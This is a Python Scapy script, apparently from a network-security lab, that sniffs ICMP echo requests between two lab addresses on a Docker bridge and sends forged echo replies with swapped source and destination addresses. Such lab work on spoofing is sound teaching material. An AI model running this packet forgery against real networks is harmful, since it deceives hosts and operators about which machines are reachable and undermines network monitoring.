#!/usr/bin/env python3

from scapy.all import *


def spoof_pkt(pkt):

    # Process only ICMP Echo Requests
    if IP in pkt and ICMP in pkt and pkt[ICMP].type == 8:

        print("------------- ICMP request captured -------------")
        pkt.show()

        # Create spoofed IP header
        a = IP()
        a.src = pkt[IP].dst
        a.dst = pkt[IP].src

        # Create ICMP Echo Reply
        b = ICMP()
        b.type = 0
        b.id = pkt[ICMP].id
        b.seq = pkt[ICMP].seq

        # Copy payload from the original Echo Request
        data = bytes(pkt[ICMP].payload)

        # Construct the spoofed Echo Reply
        spoofed_pkt = a/b/data

        print("------------- sending spoofed reply -------------")
        spoofed_pkt.show()

        # Send the forged reply
        send(spoofed_pkt, verbose=False)


# Sniff ICMP Echo Requests from Host A to IP_1
pkt = sniff(
    iface=['br-bad22f081d4d'],
    filter='icmp and src host 10.9.0.5 and dst host 3.6.0.9',
    prn=spoof_pkt
)